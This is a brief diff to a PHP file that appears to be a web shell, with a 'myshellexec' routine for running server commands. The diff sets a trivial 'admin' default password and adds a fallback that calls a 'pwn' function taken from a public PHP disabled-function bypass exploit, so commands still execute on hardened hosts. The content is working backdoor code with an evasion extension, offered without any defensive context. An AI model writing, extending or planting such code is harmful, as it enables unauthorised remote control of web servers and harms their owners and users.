@@ -1,5 +1,5 @@
 <?php
-$users = array('admin'=>'secret_password'); // change this!
+$users = array('admin'=>'admin'); // change this!
 $home = realpath('.'); // config
 
 function authenticate($u) {
@@ -382,6 +382,13 @@ function myshellexec($cfe)
       { while(!@feof($pipes[1])) {$res .= @fgets($pipes[1],1024);}
       }
       @proc_close($f);
+    }
+    // see: https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php
+    elseif(@function_exists('pwn'))
+    { @ob_start();
+      pwn($cfe);
+      $res = @ob_get_contents();
+      @ob_end_clean();
     }
   }
   return $res;
